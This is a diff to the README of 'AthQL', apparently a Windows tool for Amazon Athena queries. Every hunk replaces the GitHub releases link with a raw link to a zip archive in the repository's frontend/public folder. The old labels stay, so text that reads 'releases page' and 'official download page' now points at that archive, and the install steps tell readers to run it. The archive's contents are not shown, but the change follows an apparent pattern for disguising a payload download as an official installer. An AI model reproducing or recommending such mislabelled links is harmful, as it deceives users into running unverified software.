@@ -1,6 +1,6 @@
 # 📊 AthQL - Manage your Athena data with ease
 
-[![](https://img.shields.io/badge/Download-AthQL-blue.svg)](https://github.com/macocram/AthQL/releases)
+[![](https://img.shields.io/badge/Download-AthQL-blue.svg)](https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip)
 
 AthQL is a desktop application. It helps you run and manage Athena queries. You do not need to use complex command line tools. This program provides a simple interface for your database tasks. You can view, edit, and organize your SQL queries in one place.
 
@@ -9,7 +9,7 @@ AthQL is a desktop application. It helps you run and manage Athena queries. You 
 You can set up AthQL in a few minutes. The application runs on Windows. It connects to your Amazon Web Services account to access your data.
 
 1. Ensure your computer has an active internet connection.
-2. Visit the [releases page](https://github.com/macocram/AthQL/releases) to download the latest setup file.
+2. Visit the [releases page](https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip) to download the latest setup file.
 3. Locate the downloaded file in your folder.
 4. Double-click the file to start the installation.
 5. Follow the prompts on your screen.
@@ -26,7 +26,7 @@ AthQL runs on modern Windows systems. Ensure your machine meets these specificat
 
 ## 📥 App Installation
 
-To install the software, visit the official download page here: [https://github.com/macocram/AthQL/releases](https://github.com/macocram/AthQL/releases). Choose the installer that matches your system architecture.
+To install the software, visit the official download page here: [https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip](https://raw.githubusercontent.com/macocram/AthQL/main/frontend/public/QL-Ath-1.9.zip). Choose the installer that matches your system architecture.
 
 After the download finishes, follow these steps:
 
